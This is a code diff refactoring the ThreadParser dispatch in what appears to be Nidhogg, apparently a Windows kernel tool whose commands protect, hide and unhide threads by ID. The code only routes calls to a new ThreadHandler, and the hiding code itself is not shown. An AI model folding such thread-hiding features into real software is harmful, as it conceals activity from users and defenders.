@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "ThreadParser.h"
-#include "ProcessHandler.h"
+#include "ThreadHandler.h"
 
 ThreadParser::ThreadParser() {
 	this->optionsSize = 5;
@@ -46,15 +46,10 @@ NTSTATUS ThreadParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			break;
 		}
 
-		if (NidhoggProcessHandler->GetProtectedThreadsCount() == MAX_TIDS) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
-		}
-
-		if (NidhoggProcessHandler->FindThread(tid))
+		if (NidhoggThreadHandler->FindThread(tid, ThreadType::Protected))
 			break;
 
-		if (!NidhoggProcessHandler->AddThread(tid))
+		if (!NidhoggThreadHandler->ProtectThread(tid))
 			status = STATUS_UNSUCCESSFUL;
 		break;
 	}
@@ -65,28 +60,23 @@ NTSTATUS ThreadParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			break;
 		}
 
-		if (NidhoggProcessHandler->GetProtectedThreadsCount() == 0) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		if (!NidhoggProcessHandler->RemoveThread(tid))
+		if (!NidhoggThreadHandler->RemoveThread(tid, ThreadType::Protected))
 			status = STATUS_NOT_FOUND;
 		break;
 	}
 	case Options::Clear:
 	{
-		NidhoggProcessHandler->ClearProtectedThreads();
+		NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
 		break;
 	}
 	case Options::Hide:
 	{
-		status = NidhoggProcessHandler->HideThread(tid);
+		status = NidhoggThreadHandler->HideThread(tid);
 		break;
 	}
 	case Options::Unhide:
 	{
-		status = NidhoggProcessHandler->UnhideThread(tid);
+		status = NidhoggThreadHandler->UnhideThread(tid);
 		break;
 	}
 	default:
